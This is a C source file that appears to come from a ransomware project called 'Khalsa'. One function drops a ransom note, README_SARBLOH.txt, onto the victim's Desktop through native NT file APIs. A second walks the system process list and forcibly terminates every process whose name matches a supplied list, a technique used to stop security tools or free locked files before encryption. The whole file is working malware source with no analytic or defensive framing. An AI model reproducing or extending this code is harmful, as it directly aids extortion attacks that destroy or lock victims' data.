#include "khalsa_checks.h"
#include "khalsa_clib.h"
BOOL DropReadMe(LPCWSTR lpcszContents) {
    // check if the README file exists, if it does then abort
    DWORD dwContentLength = 0;
    BOOL rv = FALSE;
    HANDLE FileHandle;
    IO_STATUS_BLOCK IoStatusBlock;
    OBJECT_ATTRIBUTES ObjectAttributes;

    DWORD nSize = MAX_PATH;
    USHORT UniSize = min(nSize, UNICODE_STRING_MAX_CHARS - 2);

    WCHAR szUserProfile[MAX_PATH], szNewFilePath[MAX_PATH];
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    UNICODE_STRING  usUserProfileNt, usUserProfile, usUserProfileStr = RTL_CONSTANT_STRING(L"%USERPROFILE%");




    ZeroBuffer(szNewFilePath, MAX_PATH);
    
    
    RtlInitEmptyUnicodeString(&usUserProfile, szUserProfile, UniSize * sizeof(WCHAR));
    status = _RtlExpandEnvironmentStrings_U(NULL, &usUserProfileStr, &usUserProfile, &nSize);

    _wsprintfW(szUserProfile, L"%s\\Desktop\\README_SARBLOH.txt", usUserProfile.Buffer);

    if (!_RtlDosPathNameToRelativeNtPathName_U(szUserProfile, &usUserProfileNt, NULL, NULL)) {
        return rv;
    }


    /* build the object attributes */
    InitializeObjectAttributes(&ObjectAttributes, &usUserProfileNt, 0, NULL, NULL);
    DWORD dwDesiredAccess = SYNCHRONIZE | FILE_GENERIC_WRITE;
    DWORD FileAttributes = FILE_ATTRIBUTE_NORMAL | (FILE_READ_ATTRIBUTES & (FILE_ATTRIBUTE_VALID_FLAGS & ~FILE_ATTRIBUTE_DIRECTORY));;
    DWORD dwCreationDisposition = FILE_CREATE;



    ULONG Flags = FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE;
    NTSTATUS Status = _NtCreateFile(&FileHandle, dwDesiredAccess, &ObjectAttributes, &IoStatusBlock, NULL, FileAttributes, 0, dwCreationDisposition, Flags, NULL, 0);


    _HeapFree(_GetProcessHeap(), 0, usUserProfileNt.Buffer);
    if (FileHandle != INVALID_HANDLE_VALUE) {
        dwContentLength = (_wcslen(lpcszContents) + 1) *sizeof(WCHAR);
        
        Status = _NtWriteFile(FileHandle, NULL, NULL, NULL, &IoStatusBlock, lpcszContents, dwContentLength, 0, NULL);
        if(NT_SUCCESS(Status)){
            if(IoStatusBlock.Information == dwContentLength)
                rv = TRUE;
        }
        _NtClose(FileHandle);
    }
    return rv;
}

BOOL Khalsa_IsWindowOpen(LPWSTR* lpszClassName)
{

    BOOL rv = FALSE;
    ULONG ulProcessInfo = 0;
    NTSTATUS status = _NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &ulProcessInfo);
    if (status != STATUS_INFO_LENGTH_MISMATCH) {
        return rv;
    }

    PVOID pProcessListBuf = _HeapAlloc(_GetProcessHeap(), 0, ulProcessInfo);
    if (!pProcessListBuf) {
        return rv;
    }
    ZeroBuffer(pProcessListBuf, ulProcessInfo);


    status = _NtQuerySystemInformation(SystemProcessInformation, pProcessListBuf, ulProcessInfo, &ulProcessInfo);
    if (!NT_SUCCESS(status)) {
       rv = _HeapFree(_GetProcessHeap(), 0, pProcessListBuf);
       return rv;
    }
    PSYSTEM_PROCESS_INFORMATION pSpi = (PSYSTEM_PROCESS_INFORMATION)pProcessListBuf;
    while (pSpi->NextEntryOffset) {
        LPWSTR lpszProcessName = pSpi->ImageName.Buffer;
        
        
        if (lpszProcessName == NULL)
            goto next_loop;

        SIZE_T i = 0;

        while (lpszClassName[i] != NULL) {
            if (!__CmpStrW(lpszProcessName, lpszClassName[i])) {

                HANDLE hProcess = INVALID_HANDLE_VALUE;
                OBJECT_ATTRIBUTES ObjectAttributes;
                CLIENT_ID ClientId;
                InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);                
                ClientId.UniqueProcess = ((PVOID)(UINT_PTR)pSpi->UniqueProcessId);
                ClientId.UniqueThread = 0;
                status = _NtOpenProcess(&hProcess, PROCESS_TERMINATE, &ObjectAttributes, &ClientId);
                if (NT_SUCCESS(status)) {
                    _NtTerminateProcess(hProcess, STATUS_SUCCESS);
                }

                if(hProcess != INVALID_HANDLE_VALUE)
                    _NtClose(hProcess);

                break;
            }

            i++;
        }
    next_loop:

        pSpi = (PSYSTEM_PROCESS_INFORMATION)(((PUCHAR)pSpi) + pSpi->NextEntryOffset);

    }
    if(pProcessListBuf != NULL)
        _HeapFree(_GetProcessHeap(), 0, pProcessListBuf);

    return rv;
}
